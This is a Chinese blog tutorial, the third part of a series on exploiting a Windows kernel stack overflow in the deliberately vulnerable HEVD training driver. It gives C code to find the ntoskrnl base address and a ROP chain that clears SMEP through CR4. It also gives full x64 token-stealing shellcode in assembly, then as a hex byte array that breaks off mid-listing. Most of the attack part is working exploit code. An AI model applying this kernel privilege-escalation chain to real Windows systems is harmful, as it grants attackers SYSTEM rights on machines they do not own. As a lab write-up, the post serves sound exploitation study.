<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【Win Pwn】从零探索现代windows内核栈溢出-以HEVD练习为例（下）</title><meta name="description" content="&lt;hr /&gt;
&lt;p&gt;上：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;中：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13365&quot;&gt;https://xz.aliyun.com/t/13365&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本附录对第二章的以下几个遗留问题做出说明&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;user编程寻找ROPGadget&lt;/li&gt;
&lt;li&gt;shellcode编写&lt;/li&gt;
&lt;li&gt;Token提权&lt;/li&gt;
&lt;li&gt;KVAS&lt;/li&gt;
&lt;/ul&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【Win Pwn】从零探索现代windows内核栈溢出-以HEVD练习为例（下）</h3><div class="article__date metadata"><div class="post-info">2024/01/25</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/kernel/">kernel</a><a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><hr />
<p>上：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</a></p>
<p>中：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</a></p>
<p>文章已在先知社区投稿：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13365">https://xz.aliyun.com/t/13365</a></p>
<p>本附录对第二章的以下几个遗留问题做出说明</p>
<ul>
<li>user编程寻找ROPGadget</li>
<li>shellcode编写</li>
<li>Token提权</li>
<li>KVAS</li>
</ul>
<span id="more"></span>
<h1 id="user编程寻找ropgadget"><a class="markdownIt-Anchor" href="#user编程寻找ropgadget"></a> user编程寻找ROPGadget</h1>
<p>ROP全称加返回导向性编程，比如这一章用到的Gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mov cr4, rcx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>关于<code>ret</code>汇编本质上就是从栈帧中取出值，然后将<code>ip</code>寄存器设置为该值，等价于<code>pop ip</code>，这样就能完成函数调用的返回等等。</p>
<p>本章中当我们发生栈溢出时，就会把<code>ret</code>的位置设置为第一段gadget的位置</p>
<ul>
<li><code>pop rcx</code>就会将此时栈顶的值<code>0x00000000002506f8</code>存入<code>rcx</code>寄存器，然后<code>ret</code>又从栈顶取出地址<code>mov_rc4_rcx_ret</code>，然后<code>rip</code>寄存器就跳转执行了</li>
<li><code>mov rc4, rcx</code>将<code>rcx</code>值存入<code>rc4</code>中然后<code>ret</code>又将栈顶的值<code>shellcode_addr</code>设置为<code>rip</code>寄存器的值后返回</li>
</ul>
<p>细心一点就会发现本章截图中的地址不一样，因为内核加载时的内存虚拟地址也是随机化的，不过寻址方式依旧是<code>基地址</code>+<code>偏移</code></p>
<p>这就引申出函数第一段代码：找到内核的基地址</p>
<h2 id="a找到内核基地址"><a class="markdownIt-Anchor" href="#a找到内核基地址"></a> A.找到内核基地址</h2>
<p>通过<code>NtQuerySystemInformation </code>这个“半隐藏”函数实现的</p>
<p>MSDN：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in, out] SystemInformation</span><br></pre></td></tr></table></figure>
<p>指向接收请求信息的缓冲区的指针。 此信息的大小和结构因 <em>SystemInformationClass</em> 参数的值而异：</p>
</blockquote>
<p>很可惜，关于<code>SystemInformationClass</code>微软并没有公开它的设计，网上有很多关于此的资料</p>
<p><code>SYSTEM_INFORMATION_CLASS</code>：<a target="_blank" rel="noopener" href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm</a></p>
<p>他是一个枚举，其中<code>0xB</code>就代表着要查询的是<code>SystemModuleInformation</code></p>
<p><code>SYSTEM_MODULE</code>：<a target="_blank" rel="noopener" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html">http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_MODULE</span> &#123;</span><br><span class="line">  ULONG                Reserved1;</span><br><span class="line">  ULONG                Reserved2;</span><br><span class="line">  PVOID                ImageBaseAddress;</span><br><span class="line">  ULONG                ImageSize;</span><br><span class="line">  ULONG                Flags;</span><br><span class="line">  WORD                 Id;</span><br><span class="line">  WORD                 Rank;</span><br><span class="line">  WORD                 w018;</span><br><span class="line">  WORD                 NameOffset;</span><br><span class="line">  BYTE                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125; SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br></pre></td></tr></table></figure>
<p><code>SystemInformation</code>就是由<code>SYSTEM_MODULE</code>数组作为成员的结构体，这个没有官方文档，也是通过逆向得到的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG                ModulesCount;</span><br><span class="line">	SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure>
<p>关于查询函数的定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>首先从<code>ntdll</code>导入函数</li>
<li>然后初始化变量</li>
<li>查询后打印并返回，如果没有查到就返回0</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span> </span>&#123;</span><br><span class="line">	PVOID kernelImageBase = <span class="literal">NULL</span>;</span><br><span class="line">	PCHAR kernelImage = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//import function `NtQuerySystemInformation`</span></span><br><span class="line">	HMODULE ntdll = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;ntdll&quot;</span>));</span><br><span class="line">	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(ntdll, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (NtQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress() failed.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//init length</span></span><br><span class="line">	ULONG len = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;len);</span><br><span class="line">	<span class="comment">//init module infomations</span></span><br><span class="line">	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)<span class="built_in">GlobalAlloc</span>(GMEM_ZEROINIT, len);</span><br><span class="line">	<span class="keyword">if</span> (pModuleInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase]  Could not allocate memory for module info.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//starting quering</span></span><br><span class="line">	NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, pModuleInfo, len, &amp;len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123;</span><br><span class="line">		kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(kernelImage, ModuleName)) &#123;</span><br><span class="line">			kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[*] [ulGetKernelBase]  Mod name %s &quot;</span>, kernelImage);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%llx\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%X\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">			<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)kernelImageBase;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="b-找到对应汇编"><a class="markdownIt-Anchor" href="#b-找到对应汇编"></a> B. 找到对应汇编</h2>
<p>可以使用CTF常用工具<code>ROPGadget</code>，他支持<code>PE</code>格式（因为用的Capstone反汇编引擎）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
<p>试试<code>ntoskrl.exe</code>的</p>
<p><img src="https://img.joe1sn.top/uploads/big/5932a20543fd1420ae321f901e1f4c44.png" alt="image-20240119172454699" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000014039eb47 : mov cr4, rcx ; ret</span><br></pre></td></tr></table></figure>
<p>得到基地址是<code>0x39eb47</code>，另外一个gadget同理</p>
<p>重写修改下EXP</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx = base+ <span class="number">0x20C64C</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_cr4_rcx = base+ <span class="number">0x39eb47</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx;</span><br><span class="line"><span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_cr4_rcx;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/14da4b6cf8f39c3a16855b7a20fbf476.png" alt="image-20240119174839482" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/6c94aaf54fc86ee593668486a2df81a4.png" alt="image-20240119174924327" /></p>
<p>一些常见的gadget字节序列</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;RET&quot;</span> , &#123; <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RCX&quot;</span>, &#123; <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_CR4_RCX&quot;</span>, &#123; <span class="number">0x0f</span>, <span class="number">0x22</span>, <span class="number">0xe1</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;NOP&quot;</span>, &#123; <span class="number">0x4d</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX_POP_RCX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RCX_PTRRAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x08</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RAX_PTRRCX&quot;</span>, &#123; <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_RAX_RAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_ESI_ESI&quot;</span>, &#123; <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br></pre></td></tr></table></figure>
<p>如果想直接从二进制读取（这样更快）可以使用：<a target="_blank" rel="noopener" href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a> 提供的思路去找</p>
<h1 id="shellcode编写"><a class="markdownIt-Anchor" href="#shellcode编写"></a> shellcode编写</h1>
<h2 id="a-手动进行token提权"><a class="markdownIt-Anchor" href="#a-手动进行token提权"></a> A. 手动进行Token提权</h2>
<p>第二章中使用的是他人提供的shellcode，这里尝试自己写汇编</p>
<p>注意，这里我们已经进入内核了，所以做的事情和user级别不一样</p>
<p>同<code>KRPOCESS</code>不同的是<code>EPROCESS</code>描述了程序运行的相关环境，例如：对应的<code>KPROCESS</code>指针、程序的权限等</p>
<p>在windbg中使用 ，可以列举所有的进程的相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!process 0 0 &lt;process_name&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/d79ca59d6f4e93813d144c57ed739409.png" alt="image-20240119180801648" /></p>
<p>使用下面的命令来查看对应的EPROCESS结构体，这里查看<code>System</code>进程的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt nt!_EPROCESS &lt;Process address&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/ab3f24cc80b2f59949d0f14718347944.png" alt="image-20240119181007630" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/e55eccd39e6efc555de0f0b2aae95b32.png" alt="image-20240119181255215" /></p>
<p>Token是一个<code>_EX_FAST_REF</code>类型的Union值</p>
<p><img src="https://img.joe1sn.top/uploads/big/197b66077a9385505b318f09962398af.png" alt="image-20240119181935137" /></p>
<p><code>RefCnt</code>记录了Token引用的数目，是数据的低4位(64位中，32位是3位)</p>
<p>将当前进程的除<code>RefCnt</code>以外的其他bit位设置为和System的一致就行了，</p>
<p>这里 <code>Value</code>与掩码<code>-0xd</code>（RefCount）进行<code>&amp;</code>运算就能得到真实的Token值</p>
<p><img src="https://img.joe1sn.top/uploads/big/3783b0486f34520cceef6f7e7d4bc37b.png" alt="image-20240119183143972" /></p>
<p>现在将计算出的Token值复制给cmd.exe（<strong>这是一个新的Token</strong>）</p>
<p><img src="https://img.joe1sn.top/uploads/big/bd96556683f06ae537f449787700abd7.png" alt="image-20240119183328877" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/84780c5e389c5cc5645419cd3ec999ec.png" alt="image-20240119183538886" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/9345344e4adc9083467b09c76f86fa74.png" alt="image-20240119183521964" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/9ad936fd2b23d649493103c25b0cad43.png" alt="image-20240119183609699" /></p>
<h2 id="b-进行shellcode编写"><a class="markdownIt-Anchor" href="#b-进行shellcode编写"></a> B. 进行Shellcode编写</h2>
<p>在刚才的<code>EPROCESS</code>中，有一段记录的是程序的链表：<code>ActiveProcessLinks</code>，而且windows会生成一段独特的标识来标记每一个程序：<code>UniqueProcessId</code>，在这段 <strong>双向</strong> 链表上每段程序都可以被找到，因为可以向前和向后查找，<strong>一般System位于链表开头，所以沿着Flink查找</strong></p>
<p><img src="https://img.joe1sn.top/uploads/big/f5708429025f321352aa000e50780c46.png" alt="image-20240119193844612" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/0595f0087054b0dca2dee10c43392202.png" alt="image-20240119193859162" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/6065735bb4a5fd9a9d01cdf05b408bc7.png" alt="image-20240119194420366" /></p>
<ol>
<li>
<p>通过<code>EPROCESS</code>获得自身<code>ActiveProcessLinks</code>，同时向前/向后查找</p>
<p><a target="_blank" rel="noopener" href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">这篇文章</a>中通过模仿<code>PsGetCurrentProcess</code>，<code>gs:[188h]</code>指向的是一个<code>_KTHREAD </code>，函数的汇编会将这个地址<code>add addr,0xb8</code>，就得到了当前进程的<code>_EPROCESS</code>，这也是许多shellcode的技巧</p>
<p><img src="https://img.joe1sn.top/uploads/big/7d19f373ab80dd77cee7f9bafa5963c9.png" alt="image-20240120111712416" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/74dee9c22c569abe177a9d8a2227fa80.png" alt="image-20240120112417119" /></p>
<p><code>ffff9984d3d97080 </code>就为一个 当前进程的<code>KiInitialThread </code></p>
<p><code>+0xB8</code>指向的是当前进程的<code>EPROCESS</code>了</p>
<p><img src="https://img.joe1sn.top/uploads/big/264e3eb8c9addd711fc3d6642ba7917a.png" alt="image-20240120112153274" /></p>
<p><img src="https://img.joe1sn.top/uploads/big/253b49550220b0df56641a0ce6cd73b2.png" alt="image-20240120112206849" /></p>
</li>
<li>
<p>比较当前<code>ActiveProcessLinks</code>值<code>-8</code>的内存地址是否为<code>UniqueProcessId</code></p>
</li>
<li>
<p>否：更换当前结构体为下一个</p>
</li>
<li>
<p>是：从<code>ActiveProcessLinks-0x70</code>的位置得到<code>Token</code>地址</p>
</li>
<li>
<p>解析Token，赋值给<strong>当前进程</strong>（Windows会自动解析为exp的程序（从页表映射等来看确实应该如此））</p>
</li>
</ol>
<p>仔细逆向会发现</p>
<p><img src="https://img.joe1sn.top/uploads/big/e3e923aeebb6ddde277f7232637d651d.png" alt="image-20240120105543669" /></p>
<p>那么在没有任何栈变动的情况下<code>add rsp, 0x28</code>就能恢复栈，但是我们只有了ROP，ROP链中存在两个<code>ret</code>和一个<code>pop</code>，抬栈了0x18，所以在shellcode中只需要<code>add rsp, 0x10</code></p>
<p><img src="https://img.joe1sn.top/uploads/big/dbc0a6a596ddb6db46f6a3a920c17dbf.png" alt="image-20240120105533497" /></p>
<p>同时HEVD的<code>NT_STATUS</code>使用<code>RAX</code>检测处理是否成功，所以要<code>xor rax,rax</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax+0x188]</span><br><span class="line">    mov rax, [rax+0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax             ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax+0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]          ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax-0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax             ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]          ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure>
<p>使用nasm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &quot;C:\Users\xxxx\AppData\Local\bin\NASM\nasm.exe&quot; -f win64 .\TokenSteal.asm -o .\TokenSteal.bin</span><br></pre></td></tr></table></figure>
<p>编译出的文件位COFF格式，要提取出来，这里我用的是<code>CFF Explore</code>的快速反汇编定位到代码然后用<code>HxD</code>提取的</p>
<p><img src="https://img.joe1sn.top/uploads/big/fd7286caaeb3160933b88c897f0315a3.png" alt="image-20240120110131666" /></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">84</span>] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x89</span>, 